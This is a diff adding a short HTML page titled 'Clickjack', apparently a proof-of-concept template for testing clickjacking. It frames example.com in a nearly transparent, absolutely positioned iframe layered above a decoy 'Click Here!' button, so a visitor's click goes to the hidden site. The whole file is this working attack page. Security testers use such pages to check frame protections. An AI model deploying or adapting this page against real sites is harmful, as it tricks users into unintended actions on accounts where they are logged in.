@@ -1,0 +1,35 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Clickjack</title>
+    <style>
+        iframe {
+            width: 1440px;
+            height: 900px;
+
+            position: absolute;
+            top: -0px;
+            left: -0px;
+            z-index: 2;
+
+            -moz-opacity: 0.2;
+            opacity: 0.2;
+            filter: alpha(opacity=0.2);
+        }
+
+        button {
+            position: absolute;
+            top: 100px;
+            left: 50px;
+            z-index: 1;
+            width: 120px;
+        }
+    </style>
+</head>
+<body>
+<iframe src="http://www.example.com" scrolling="no"></iframe>
+<button>Click Here!</button>
+</body>
+</html>
+
